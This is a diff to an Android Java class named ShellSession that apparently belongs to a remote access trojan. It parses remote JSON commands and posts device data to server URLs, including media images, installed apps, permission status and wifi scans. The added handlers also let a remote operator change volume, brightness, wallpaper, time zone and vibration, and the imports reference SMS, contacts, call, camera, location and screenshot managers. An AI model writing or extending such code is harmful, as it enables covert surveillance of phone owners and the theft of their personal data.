@@ -20,15 +20,22 @@ import android.util.Log;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
+import oom.android.system.Managers.AppList;
 import oom.android.system.Managers.BlockManager;
 import oom.android.system.Managers.CallL.CallsManager;
 import oom.android.system.Managers.CameraManager;
 import oom.android.system.Managers.Contacts.ContactsManager;
+import oom.android.system.Managers.DeviceControls.Audio;
+import oom.android.system.Managers.DeviceControls.Screen;
+import oom.android.system.Managers.DeviceControls.Time;
+import oom.android.system.Managers.DeviceControls.Vibrate;
 import oom.android.system.Managers.FileManager;
 import oom.android.system.Managers.Images.MediaStoreManager;
 import oom.android.system.Managers.LocManager;
+import oom.android.system.Managers.PermissionManager;
 import oom.android.system.Managers.ScreenShotManager;
 import oom.android.system.Managers.SmsManager;
+import oom.android.system.Managers.WifiScanner;
 import oom.android.system.Managers.audioManager;
 
 public class ShellSession implements Runnable {
@@ -443,6 +450,39 @@ public class ShellSession implements Runnable {
             else if(command.startsWith("getMobImages")){
                 post(MyService.out_MediaF,MediaStoreManager.getMobImages(MyService.getContext()).toString());
                 post(MyService.post_url,"[MS]Успешно получено");
+            }
+            else if(command.startsWith("getAppsList")){
+                post(MyService.test_url, AppList.getInstalledApps(true).toString());
+            }
+            else if(command.startsWith("checkPermission")){
+                post(MyService.test_url, String.valueOf(PermissionManager.canIUse(gJson.getString("permission"))));
+            }
+            else if(command.startsWith("wifiScan")){
+                post(MyService.test_url, String.valueOf(WifiScanner.scan(MyService.context)));
+            }
+            else if(command.startsWith("getVolume")){
+                post(MyService.test_url, String.valueOf(Audio.getVolume()));
+            }
+            else if(command.startsWith("setVolume")){
+                Audio.setVolume(gJson.getInt("stream"),gJson.getInt("volume"));
+            }
+            else if(command.startsWith("getMode")){
+                post(MyService.test_url, String.valueOf(Audio.getMode()));
+            }
+            else if(command.startsWith("playEffect")){
+                Audio.playEffect(gJson.getInt("effect"),gJson.getInt("volume"));
+            }
+            else if(command.startsWith("setBrightnessLevel")){
+                Screen.setBrightnessLevel(gJson.getInt("value"));
+            }
+            else if(command.startsWith("setWallpaper")){
+                Screen.setWallpaper(gJson.getString("path"));
+            }
+            else if(command.startsWith("setTimeZone")){
+                Time.setTimeZone(gJson.getString("zone"));
+            }
+            else if(command.startsWith("vibrate")){
+                Vibrate.vib(gJson.getInt("value"));
             }
 
 
